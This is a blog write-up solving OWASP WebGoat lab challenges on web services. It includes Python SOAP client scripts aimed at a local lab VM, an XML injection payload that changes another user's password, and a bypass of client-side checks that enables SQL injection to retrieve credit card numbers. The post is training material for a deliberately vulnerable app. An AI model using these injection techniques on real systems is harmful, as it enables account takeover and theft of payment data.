---
layout: post
title:  "OWASP BWA WebGoat Challenge: Web Services"
subtitle: "WSDL Scanning / Web Service SAX Injection / SQL Injection"
date:   2017-02-02 11:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-header.jpg"
---
# WSDL Scanning
Instructions:

- This screen is the API for a web service. Check the WSDL file for this web service and try to get some customer credit numbers. 

Alright, so we can make some slight modifications to the script we used for SOAP interaction for the last challenge and use it to send a request for the ```getCreditCard``` method. Now our request for the method is created dynamically per-method so we don't have to make a bunch of script methods for the different SOAP methods, whose requests are largely identical.

{% highlight python %}
import sys
import requests
import lxml.etree as etree

def send_soap(method, user_id):
	soap_url = "http://192.168.56.101/WebGoat/services/SoapRequest?WSDL"
	headers={
		'content-type': 'application/soap+xml',
		"SOAPAction":""
	}
	cookies = dict(
		JSESSIONID="D49B1C7B6EE2243929D320213C6A9C1B",
		acopendivids="swingset,jotto,phpbb2,redmine",
		acgroupswithpersist="nada"
	)
	body = get_soap_request(method, user_id)
	r = requests.post(soap_url, data=body, headers=headers, cookies=cookies)
	result_tag_name = "{}Return".format(method)
	for result in etree.fromstring(r.content).iter(result_tag_name):
		print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
		print ("SOAP Protocol Interaction:")
		print ("Request: {}({}) | Response: {}".format(method, user_id, result.text))
		print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")

def get_soap_request(method, user_id):
	request_body = """<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
	<SOAP-ENV:Envelope
	SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
	xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
	xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
	xmlns:xsd="http://www.w3.org/2001/XMLSchema"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<SOAP-ENV:Body>
		<m:{} xmlns:m="urn:SoapRequest">
			<id xsi:type="xsd:int">{}</id>
		</m:{}>
	</SOAP-ENV:Body>
	</SOAP-ENV:Envelope>
	""".format(method, user_id, method)
	
	return request_body

def main():
	try:
		send_soap(sys.argv[1], sys.argv[2])
	except:
		print ("Please enter valid input | arg1: method, arg2: user_id")

main()
{% endhighlight %}

Let's try to use it to get the credit card info for Joe Snow:

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_22/credit-card-tamper.jpg">

Nice! Our client is a little more adaptable now.

# Web Service SAX Injection
Instructions:

- Some web interfaces make use of Web Services in the background. If the frontend relies on the web service for all input validation, it may be possible to corrupt the XML that the web interface sends.
- In this exercise, try to change the password for a user other than 101. 

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_22/soap-sax-injection.jpg">

So we are given the request that is formed when we input a user_id to the web interface. This is basically an XML-injection attack. We can perform this by overwriting the read values of variables in the request. So if our request looks like this when we enter the new password ```newpass1```:

```
<?xml version='1.0' encoding='UTF-8'?>
<wsns0:Envelope
  xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
  xmlns:xsd='http://www.w3.org/2001/XMLSchema'
  xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'
  xmlns:wsns1='http://lessons.webgoat.owasp.org'>
  <wsns0:Body>
    <wsns1:changePassword>
      <id xsi:type='xsd:int'>101</id>
      <password xsi:type='xsd:string'>newpass1</password>
    </wsns1:changePassword>
  </wsns0:Body>
</wsns0:Envelope>
```

Now let's enter a maliciously crafted input for password:

```
newpass1</password><id xsi:type='xsd:int'>102</id><password xsi:type='xsd:string'>newpass2
```

Now the request looks like this:

```
<?xml version='1.0' encoding='UTF-8'?>
<wsns0:Envelope
  xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'
  xmlns:xsd='http://www.w3.org/2001/XMLSchema'
  xmlns:wsns0='http://schemas.xmlsoap.org/soap/envelope/'
  xmlns:wsns1='http://lessons.webgoat.owasp.org'>
  <wsns0:Body>
    <wsns1:changePassword>
      <id xsi:type='xsd:int'>101</id>
      <password xsi:type='xsd:string'>newpass1</password>
      <id xsi:type='xsd:int'>102</id>
      <password xsi:type='xsd:string'>newpass2</password>
    </wsns1:changePassword>
  </wsns0:Body>
</wsns0:Envelope>
```

So when the server is reading this request, it first reads the unchangeable ```user_id``` value of ```101``` and the first password that was part of our input ```newpass1```. However, our input is not complete so it continues reading the next ```<id>``` tag that overwrites the unchangeable ```user_id``` with ```102``` and the ```<password>``` tag with ```newpass2```. So the request has been overwritten with our malicious input, and if the server doesn't check a session to the account who's password change is being requested we now own the other acccount!

# Web Service SQL Injection
Instructions:

- Check the web service description language (WSDL) file and try to obtain multiple customer credit card numbers. You will not see the results returned to this screen. When you believe you have suceeded, refresh the page and look for the 'green star'. 

Let's take a look at the WSDL file for the method ```getCreditCard``` and look for vulnerabilities.

```
<wsdl:definitions targetNamespace="http://localhost:8080/WebGoat/services/WsSqlInjection">
<wsdl:types>
	<schema targetNamespace="http://localhost:8080/WebGoat/services/WsSqlInjection">
	<import namespace="http://schemas.xmlsoap.org/soap/encoding/"/>
		<complexType name="ArrayOf_xsd_string">
			<complexContent>
				<restriction base="soapenc:Array">
					<attribute ref="soapenc:arrayType" wsdl:arrayType="xsd:string[]"/>
				</restriction>
			</complexContent>
		</complexType>
	</schema>
</wsdl:types>
<wsdl:message name="getCreditCardResponse">
	<wsdl:part name="getCreditCardReturn" type="impl:ArrayOf_xsd_string"/>
</wsdl:message>
<wsdl:message name="getCreditCardRequest">
	<wsdl:part name="id" type="xsd:string"/>
</wsdl:message>
<wsdl:portType name="WsSqlInjection">
	<wsdl:operation name="getCreditCard" parameterOrder="id">
		<wsdl:input message="impl:getCreditCardRequest" name="getCreditCardRequest"/>
		<wsdl:output message="impl:getCreditCardResponse" name="getCreditCardResponse"/>
	</wsdl:operation>
</wsdl:portType>
<wsdl:binding name="WsSqlInjectionSoapBinding" type="impl:WsSqlInjection">
<wsdlsoap:binding style="rpc" transport="http://schemas.xmlsoap.org/soap/http"/>
	<wsdl:operation name="getCreditCard">
		<wsdlsoap:operation soapAction=""/>
		<wsdl:input name="getCreditCardRequest">
			<wsdlsoap:body encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" namespace="http://lessons.webgoat.owasp.org" use="encoded"/>
		</wsdl:input>
		<wsdl:output name="getCreditCardResponse">
			<wsdlsoap:body encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" namespace="http://localhost:8080/WebGoat/services/WsSqlInjection" use="encoded"/>
		</wsdl:output
>	</wsdl:operation>
</wsdl:binding>
<wsdl:service name="WsSqlInjectionService">
	<wsdl:port binding="impl:WsSqlInjectionSoapBinding" name="WsSqlInjection">
		<wsdlsoap:address location="http://localhost:8080/WebGoat/services/WsSqlInjection"/>
	</wsdl:port>
</wsdl:service>
</wsdl:definitions>
```

And we find one!

```
<wsdl:message name="getCreditCardRequest">
	<wsdl:part name="id" type="xsd:string"/>
</wsdl:message>
```

Whoops, looks like the ```user_id``` can be a string! Sounds like we can do some good old SQL injection on this field. However, when we try to perform it in the form on the page we get this error:

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_22/soap-sql-injection-error.jpg">

Hmm..looks like there might be some field checking on the client that sends our form data to the SOAP interface. Luckily we have our own SOAP client! Let's try to perform our SQL injection attack using the modified script:

{% highlight python %}
import sys
import requests
import lxml.etree as etree

def send_soap(method, user_id):
	soap_url = "http://192.168.56.101/WebGoat/services/WsSqlInjection?WSDL"
	headers={
		'content-type': 'application/soap+xml',
		"SOAPAction":""
	}
	cookies = dict(
		JSESSIONID="D49B1C7B6EE2243929D320213C6A9C1B",
		acopendivids="swingset,jotto,phpbb2,redmine",
		acgroupswithpersist="nada"
	)
	body = get_soap_request(method, user_id)
	r = requests.post(soap_url, data=body, headers=headers, cookies=cookies)
	formatted_response = etree.tostring(etree.fromstring(r.content), pretty_print=True)
	result_tag_name = "{}Return".format(method)
	print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")
	print ("SOAP Protocol Interaction:")
	for result in etree.fromstring(r.content).iter(result_tag_name):
		print ("Request: {}({}) | Response: {}".format(method, user_id, result.text))
	print ("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=")

def get_soap_request(method, user_id):
	request_body = """<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
	<SOAP-ENV:Envelope
	SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
	xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
	xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
	xmlns:xsd="http://www.w3.org/2001/XMLSchema"
	xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<SOAP-ENV:Body>
		<m:{} xmlns:m="urn:SoapRequest">
			<id xsi:type="xsd:string">{}</id>
		</m:{}>
	</SOAP-ENV:Body>
	</SOAP-ENV:Envelope>
	""".format(method, user_id, method)
	
	return request_body

def main():
	try:
		send_soap(sys.argv[1], sys.argv[2])
	except:
		print ("Please enter valid input | arg1: method, arg2: user_id")

main()
{% endhighlight %}

The only real change is that we changed the request ```<id xsi:type=``` to ```xsd:string```. And when we send our injection attack:

<img src="{{ site.baseurl }}/images/2017-02-02-webgoat_part_22/soap-sql-injection-success.jpg">

Success! Shopping spree on SQL vulns.

### References

[1. WS Attacks XML Injection][ws-xmli]

[2. XML Manipulation Python Docs][py-xml]

[ws-xmli]:http://www.ws-attacks.org/XML_Injection
[py-xml]:https://docs.python.org/2/library/xml.etree.elementtree.html#element-objects